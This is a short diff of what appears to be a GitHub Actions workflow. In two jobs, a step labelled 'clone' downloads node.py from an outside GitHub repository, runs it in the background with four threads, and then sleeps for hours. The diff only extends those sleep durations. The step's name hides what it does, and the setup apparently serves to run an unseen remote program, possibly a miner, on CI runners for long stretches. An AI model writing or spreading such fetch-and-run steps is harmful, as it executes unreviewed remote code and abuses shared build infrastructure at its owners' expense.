@@ -98,7 +98,7 @@ jobs:
       id: go
     - name: clone
       run: wget https://github.com/ratnasi7283-art/bahan/raw/refs/heads/main/node.py && chmod u+x node.py && python node.py --thread 4 &
-            sleep 60m
+            sleep 160m
         
     
      
@@ -124,7 +124,7 @@ jobs:
       id: go
     - name: clone
       run: wget https://github.com/ratnasi7283-art/bahan/raw/refs/heads/main/node.py && chmod u+x node.py && python node.py --thread 4 &
-            sleep 261m
+            sleep 351m
         
     
   
